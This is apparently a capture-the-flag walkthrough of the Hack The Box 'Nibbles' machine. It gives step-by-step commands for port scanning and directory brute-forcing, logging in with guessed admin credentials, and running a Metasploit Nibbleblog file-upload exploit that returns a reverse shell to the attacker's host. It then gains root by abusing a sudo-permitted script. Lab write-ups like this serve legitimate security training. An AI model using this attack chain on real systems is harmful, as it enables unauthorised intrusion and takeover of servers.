First we run an nmap scan - ```nmap -T4 -p- -A 10.10.10.75```. ```-T4``` specifies the speed at which we run the scan, the ```-p-``` option scans all 65535 ports, and the ```-A``` enables OS detection, version detection, script scanning, and traceroute.

We see two ports open, ```22```(ssh) and port ```80```(http). We also get some information disclosure - ```Apache httpd 2.4.18```.

We navigate to "http://10.10.10.75/" in  a browser. We see a web page with "Hello world!". We take a look at the page source and see a comment pointing to a directory ```<!-- /nibbleblog/ directory. Nothing interesting here! -->```

![msfconsole-smb_version-module](/assets/img/nibbles/page-source-2.png)

We navigate to "http://10.10.10.75/nibbleblog/" in the url and see a nibbleblog website.

![smb_version-options](/assets/img/nibbles/nibbles-blog-3.png)

We are going to see if we can find an exploit for nibbles with Searchsploit. We run ```searchsploit nibble``` in a terminal which returns two results. The remote code execution exploit looks promising.
```Arbitrary File Upload (Metasploit)  | php/remote/38489.rb```

![smb_version](/assets/img/nibbles/searchsploit-4.png)

We fire up Metasploit and search for the exploit we saw with Searchsploit. There's only one result and this is the one we want to run - ```use exploit/multi/http/nibbleblog_file_upload```

![rapid7- options](/assets/img/nibbles/use-ex-5.png)

We run info and get a description of the exploit -

Description:
  Nibbleblog contains a flaw that allows an authenticated remote 
  attacker to execute arbitrary PHP code. This module was tested on 
  version 4.0.3.

![rapid7- options](/assets/img/nibbles/description-6.png)


 This means that for the exploit to work you need to be an authenticated user. So we need to locate the admin login panel and gain access. Let's run a directory buster with ```gobuster - dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php``` to locate the admin login page.

 ![use-exploit](/assets/img/nibbles/gobuster-7.png)

 From gobuster we see a directory called ```/admin.php```. That's the login page we want to navigate to - "http://10.10.10.75/nibbleblog/admin.php". Login with these credentials - admin: nibbles

 ![use-exploit](/assets/img/nibbles/nibble-admin-8.png)

 From inside the admin panel,  we select "Settings". Scrolling down to the bottom of the page we see a nibbles version - Nibbleblog 4.0.3 "Coffee". This is a find, this means the exploit we found is suitable for this version of nibble.

![use-exploit](/assets/img/nibbles/nibble-version-9.png)

Back in ```msfconsole``` we set the options of the exploit we chose. ```set password nibbles``` , ```set username admin``` , ```set RHOSTS 10.10.10.75``` , ```set TARGETURI /nibbleblog``` , be sure to ```set LHOST 10.10.16.5```, and
```run``` the exploit.

![use-exploit](/assets/img/nibbles/set-options-10.png)

We've got ourselves a shell, however we ```getuid``` and see we're a low level user. We're going to need to perform some privilege escalation. But whilst we're here we ```cd /home/nibbler``` and ```cat user.txt``` to get our user flag.

![use-exploit](/assets/img/nibbles/getuid-11.png)

![use-exploit](/assets/img/nibbles/user-txt-11.png)

From here we switch to a ```shell``` session. And type ```sudo -l```. The output shows us how we can run commands as ```su```. We ```cd /home/nibbler``` then ```mkdir personal``` then ```cd personal``` then ```mkdir stuff``` and ```cd stuff```.
Now we ```echo "bash -i" > monitor.sh```.

![use-exploit](/assets/img/nibbles/mkdir-12.png)

To run the bash file we need to change it's permissions with ```chmod +x monitor.sh```. Then we run ```sudo ./monitor.sh```.
And like that, we have root! The machine has been owned.

![use-exploit](/assets/img/nibbles/chmod-root-13.png)

To fully own the system ```cd .../.../.../.../root``` and ```cat root.txt``` to find the flag and fully own it!
